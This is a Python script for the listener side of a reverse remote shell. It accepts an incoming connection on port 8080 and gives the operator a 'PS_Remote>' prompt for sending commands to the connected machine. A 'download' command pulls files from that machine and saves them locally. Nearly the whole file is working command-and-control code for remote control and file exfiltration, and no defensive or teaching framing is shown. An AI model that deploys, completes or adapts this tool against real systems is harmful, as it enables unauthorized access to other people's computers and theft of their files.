import socket
import requests
import os

LHOST = '0.0.0.0'
LPORT = 8080

def get_ips():
    local = socket.gethostbyname(socket.gethostname())
    try: 
        public = requests.get('https://api.ipify.org', timeout=5).text
    except: 
        public = "Check Internet"
    return local, public

def send_msg(sock, msg):
    if isinstance(msg, str):
        msg = msg.encode('utf-8')
    msg_len = str(len(msg)).zfill(16)
    sock.send(msg_len.encode() + msg)

def recv_msg(sock, decode=True):
    raw_msg_len = sock.recv(16).decode().strip()
    if not raw_msg_len.isdigit():
        print("[-] Error: Received invalid message length. Dropping connection.")
        exit(0)
        return
    msg_len = int(raw_msg_len)
    MAX_SIZE = 100 * 1024 * 1024 
    if msg_len > MAX_SIZE:
        print(f"[-] Error: Message too large ({msg_len} bytes). Potential attack!")
        exit(0)
        return
    if not raw_msg_len: return None
    try:
        msg_len = int(raw_msg_len)
    except:
        return None
        
    data = b""
    while len(data) < msg_len:
        chunk = sock.recv(min(msg_len - len(data), 4096))
        if not chunk: break
        data += chunk
    
    if decode:
        return data.decode('utf-8', errors='ignore')
    return data

def start_server():
    local, public = get_ips()
    print(f"Internal IP: {local} | External IP: {public}")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((LHOST, LPORT))
    s.listen(1)
    print(f"[*] Listening on {LHOST}:{LPORT}...")
    
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")
    
    print(recv_msg(conn))
    
    while True:
        cmd = input("PS_Remote> ").strip()
        if not cmd: continue
        
        send_msg(conn, cmd)
        
        if cmd.lower() == 'exit':
            break
        
        if cmd.startswith('download '):
            parts = cmd.split(maxsplit=1)
            if len(parts) < 2: continue
            
            raw_filename = parts[1]
            clean_filename = os.path.basename(raw_filename)

            if not clean_filename or clean_filename in [".", ".."]:
                print("[-] Security Warning: Invalid path detected!")
                continue

            file_data = recv_msg(conn, decode=False)
            
            if not file_data or file_data.startswith(b"Error:"):
                print(f"[-] Download failed: {file_data}")
                continue

            
            save_path = f"dl_{clean_filename}.zip"
            if os.path.exists(save_path):
                save_path = f"dl_{os.urandom(2).hex()}_{clean_filename}.zip"

            with open(save_path, "wb") as f:
                f.write(file_data)
            print(f"[+] Securely saved to: {save_path}")
        else:
            result = recv_msg(conn)
            print(result)

    conn.close()
    s.close()

if __name__ == "__main__":
    start_server()